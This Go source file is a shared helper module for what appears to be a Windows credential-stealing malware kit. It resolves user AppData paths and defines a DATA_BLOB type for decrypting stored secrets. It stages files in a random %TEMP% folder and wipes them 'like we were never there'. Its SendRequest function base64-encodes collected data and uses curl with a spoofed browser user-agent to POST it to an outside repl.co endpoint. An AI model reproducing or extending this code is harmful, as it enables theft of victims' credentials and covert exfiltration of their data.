package main

// This file contains a list of shared dependency functions across the different payload libraries.

import (
	"encoding/base64"
	"errors"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
	"unsafe"

	_ "github.com/mattn/go-sqlite3"
)

const (
	numberBytes string = "0123456789"
	letterBytes string = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
)

var (
	USER string = GetUsername()

	LOCAL    string = os.Getenv("LOCALAPPDATA")
	ROAMING  string = os.Getenv("APPDATA")
	TEMP     string = os.Getenv("TEMP")
	PERSONAL string = os.Getenv("USERPROFILE")

	HEADERS [999]string

	TEMPFILEDIR string = TEMP + "\\" + RandStringBytes(16)
)

// Define a struct to match the IP Api JSON response structure
type GeoLocation struct {
	Query       string  `json:"query"`
	Status      string  `json:"status"`
	Country     string  `json:"country"`
	CountryCode string  `json:"countryCode"`
	Region      string  `json:"region"`
	RegionName  string  `json:"regionName"`
	City        string  `json:"city"`
	Zip         string  `json:"zip"`
	Lat         float64 `json:"lat"`
	Lon         float64 `json:"lon"`
	Timezone    string  `json:"timezone"`
	Isp         string  `json:"isp"`
	Org         string  `json:"org"`
	As          string  `json:"as"`
}

type DATA_BLOB struct {
	cbData uint32
	pbData *byte
}

// everything that is too large to be stored in ram, gets stored in the %TEMP% directory
// this function removes our scraps from %TEMP% (like we were never there)
func CleanUp() {
	_ = os.RemoveAll(TEMPFILEDIR)
}

// returns a boolean representing a file's existence on the system
func FileExists(filePath string) bool {
	_, err := os.OpenFile(filePath, os.O_RDWR, 0666)
	if errors.Is(err, os.ErrNotExist) {
		return false
	} else {
		return true
	}
}

// converts a byte array to a windows native DATA_BLOB type
func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

// converts a windows native DATA_BLOB type to a byte array
func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

// self-explanatory, copies `pathSourceFile` to `pathDestFile`
func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

// sends an http POST request to our S7 API
func SendRequest(body string) {

	var encoded_payload string = strings.ReplaceAll(base64.StdEncoding.EncodeToString([]byte(body)), "=", "")

	exec.Command("curl",
		"--location",
		"--request",
		"POST",
		"https://liveton.studio7.repl.co/go",
		"--header", "Content-Type: application/x-www-form-urlencoded",
		"--header", "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
		"--data-urlencode", "id="+encoded_payload).Start()

}

// generates a random string of `n` length
func RandStringBytes(n int) string {
	rand.Seed(time.Now().UnixNano())

	b := make([]byte, n)
	for i := range b {
		b[i] = letterBytes[rand.Intn(len(letterBytes))]
	}
	return string(b)
}

// unused
//func RandIntBytes(n int) string {
//	rand.Seed(time.Now().UnixNano())
//
//	b := make([]byte, n)
//	for i := range b {
//		b[i] = numberBytes[rand.Intn(len(numberBytes))]
//	}
//	return string(b)
//}
